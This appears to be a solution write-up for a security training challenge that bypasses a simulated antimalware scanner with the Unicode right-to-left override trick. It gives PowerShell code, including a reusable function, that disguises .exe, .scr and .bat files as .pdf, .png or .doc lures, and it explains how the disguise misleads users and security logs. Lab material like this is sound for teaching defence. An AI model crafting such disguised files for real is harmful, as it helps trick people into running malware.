---
title: "Solution 25: Right-to-Left Override (RTLO) Unicode Trick"
challenge_number: 25
difficulty: hard
category: "Extension Heuristic Bypass"
permalink: /solutions/25-rtlo-unicode/
---

# Solution: Right-to-Left Override (RTLO) Unicode Trick

[Back to Challenge](../challenges/25-rtlo-unicode.md)

## Overview

The Unicode character U+202E (Right-to-Left Override) reverses the display direction of all subsequent characters. By inserting it before a fake extension, the visual filename appears completely different from the actual filename. For example, `report[U+202E]fdp.exe` displays as `reportexe.pdf` — the user sees "pdf" but the actual extension is ".exe".

## Working Code

### Creating Files with RTLO Character

```powershell
# U+202E is the Right-to-Left Override character
$rtlo = [char]0x202E

# File is actually "report<RTLO>fdp.exe"
# Displays visually as: "reportexe.pdf"
$name = "report${rtlo}fdp.exe"
New-Item -Path $name -ItemType File
Set-Content -Path $name -Value "MZ`0`0PE payload here"

Write-Host "Created file: $name"
Write-Host "Visual appearance: reportexe.pdf"
Write-Host "Actual extension: .exe"
```

### Explanation of Character Reversal

```
Actual bytes in filename:
  r e p o r t [U+202E] f d p . e x e

Display rendering (after RTLO, text is reversed):
  r e p o r t e x e . p d f
                ←←←←←←←←←←← (reversed)

The portion "fdp.exe" displayed right-to-left becomes "exe.pdf"
```

### More Examples

```powershell
$rtlo = [char]0x202E

# "photo<RTLO>gnp.exe" displays as "photoexe.png"
$name1 = "photo${rtlo}gnp.exe"
New-Item $name1 -ItemType File

# "music<RTLO>3pm.scr" displays as "musicrcs.mp3"
$name2 = "music${rtlo}3pm.scr"
New-Item $name2 -ItemType File

# "document<RTLO>cod.bat" displays as "documenttab.doc"
$name3 = "document${rtlo}cod.bat"
New-Item $name3 -ItemType File

# More convincing: "annual_report_<RTLO>fdp.exe" -> "annual_report_exe.pdf"
$name4 = "annual_report_${rtlo}fdp.exe"
New-Item $name4 -ItemType File
```

### Crafting Specific Visual Names

```powershell
$rtlo = [char]0x202E

# To make "filename" display as ending in ".pdf":
# Actual ending must be "fdp.XXX" (reversed: "XXX.pdf")
# Choose XXX to be a real extension

# Target visual: "invoice_2024.pdf"
# Strategy: "invoice_2024" + RTLO + "fdp." + real_ext_reversed
# "invoice_2024<RTLO>fdp.exe" -> "invoice_2024exe.pdf"

# Better: include the dot before RTLO for cleaner appearance
# "invoice_2024<RTLO>fdp.exe" -> displays "invoice_2024exe.pdf"

function New-RTLOFile {
    param(
        [string]$BaseName,         # e.g., "invoice_2024"
        [string]$FakeExtReversed,  # e.g., "fdp" (displays as "pdf")
        [string]$RealExt           # e.g., "exe"
    )
    $rtlo = [char]0x202E
    $filename = "${BaseName}${rtlo}${FakeExtReversed}.${RealExt}"
    New-Item -Path $filename -ItemType File -Force
    Write-Host "Created: $filename"
    Write-Host "Displays as: ${BaseName}${RealExt}.$(($FakeExtReversed[-1..-($FakeExtReversed.Length)] -join ''))"
}

New-RTLOFile -BaseName "quarterly_results" -FakeExtReversed "fdp" -RealExt "exe"
New-RTLOFile -BaseName "team_photo" -FakeExtReversed "gnp" -RealExt "scr"
New-RTLOFile -BaseName "budget_2024" -FakeExtReversed "xslx" -RealExt "bat"
```

### Verifying the Visual Trick

```powershell
# List the file to see how the terminal renders it
$rtlo = [char]0x202E
$name = "report${rtlo}fdp.exe"
Set-Content -Path $name -Value "test"

# Get raw bytes of the filename to prove RTLO is present
$bytes = [System.Text.Encoding]::Unicode.GetBytes($name)
Write-Host "Raw filename bytes (UTF-16LE):"
Write-Host ($bytes | ForEach-Object { $_.ToString("X2") }) -Separator " "
# You'll see "2E 20" (U+202E in little-endian) in the byte sequence
```

## Why It Works

The scanner's extension parsing:

```nim
let dotPos = filename.rfind('.')
let ext = filename[dotPos+1..^1].toLowerAscii()
```

When processing `report[U+202E]fdp.exe`:
- `rfind('.')` finds the ASCII period (0x2E) between "fdp" and "exe"
- Extracts extension: `"exe"`
- This triggers a **warning** (but remember: warnings never block)

However, the deeper bypass is about the **visual deception**:
- The file passes through the scanner (extension check only warns)
- The file appears to users and administrators as a `.pdf` file
- Security tools logging filenames may display the reversed name
- SIEM alerts showing "reportexe.pdf was scanned" look benign

The RTLO character also potentially confuses string processing:
- If the scanner logs or displays filenames, the RTLO may cause display corruption
- Some parsers may handle the multi-byte UTF-8 encoding (E2 80 AE) incorrectly
- File path operations in some languages don't account for Unicode bidi characters

## How to Verify

1. Create an RTLO-named file:
   ```powershell
   $rtlo = [char]0x202E
   $name = "harmless${rtlo}fdp.exe"
   @"
   @echo off
   echo RTLO bypass successful
   "@ | Set-Content $name
   ```

2. Run the scanner:
   ```powershell
   # Note: you may need to pass the filename carefully due to RTLO
   nim_antimalware_sim.exe "harmless?fdp.exe"
   ```

3. Expected result: Scanner may warn about `.exe` but **never blocks**. The file executes freely.

4. Verify visual appearance:
   ```powershell
   # Open Explorer in current directory
   explorer.exe .
   # Observe how the file appears in the file listing
   ```

5. Confirm execution:
   ```powershell
   & ".\$name"
   # Output: RTLO bypass successful
   ```

6. Check raw bytes to prove RTLO is embedded:
   ```powershell
   [System.IO.Path]::GetFileName($name) | ForEach-Object {
       $bytes = [System.Text.Encoding]::UTF8.GetBytes($_)
       ($bytes | ForEach-Object { "0x{0:X2}" -f $_ }) -join " "
   }
   # Look for E2 80 AE (UTF-8 encoding of U+202E)
   ```
